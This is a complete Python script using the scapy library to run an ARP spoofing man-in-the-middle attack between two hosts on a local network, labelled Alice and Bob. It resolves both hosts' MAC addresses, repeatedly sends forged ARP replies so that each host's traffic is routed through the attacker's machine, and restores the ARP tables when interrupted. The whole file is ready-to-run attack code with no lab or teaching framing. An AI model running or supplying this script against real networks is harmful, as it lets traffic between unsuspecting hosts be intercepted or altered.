#!/usr/bin/env python

from time import sleep
import signal
import sys

# Handle CTRL+C / SIGINT to properly stop the attack
# Rearping targets to restore network
def signal_handler(sig, frame):
  global alice_ip
  global bob_ip
  global alice_hw
  global bob_hw    
  print('Network restoration on Alice')
  send(ARP(pdst=alice_ip, hwdst=alice_hw, psrc=bob_ip, hwsrc=bob_hw, op=2), count=5, inter=.2)
  print('Network restoration on Bob')
  send(ARP(pdst=bob_ip, hwdst=bob_hw, psrc=alice_ip, hwsrc=alice_hw, op=2), count=5, inter=.2)
  sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

from scapy.all import *
conf.verb = 0

iface = sys.argv[1]
alice_ip = sys.argv[2]
bob_ip = sys.argv[3]

# Grabbing our IP and MAC
me_ip = get_if_addr(iface)
me_hw = get_if_hwaddr(iface)
print('Me ( {0} ) is at {1}'.format(me_ip, me_hw))

# Grabbing Alice MAC
x = sr1(ARP(pdst=alice_ip), iface=iface, timeout=2)
alice_hw = x.hwsrc
print('Alice ( {0} ) is at {1}'.format(alice_ip, alice_hw))

# Grabbing Bob MAC
x = sr1(ARP(pdst=bob_ip), iface=iface, timeout=2)
bob_hw = x.hwsrc
print('Bob ( {0} ) is at {1}'.format(bob_ip, bob_hw))

# Spoofing network
print('Spoofing in progress ... Send SIGINT to properly stop the attack.')
while True:
  # Tell to Alice that we are Bob
  x = ARP(pdst=alice_ip, hwdst=alice_hw, hwsrc=me_hw, psrc=bob_ip, op=2)
  send(x)

  # Tell to Bob that we are Alice
  x = ARP(pdst=bob_ip, hwdst=bob_hw, hwsrc=me_hw, psrc=alice_ip, op=2)
  send(x)

  # Do not unnecessarily overload the network
  sleep(5)
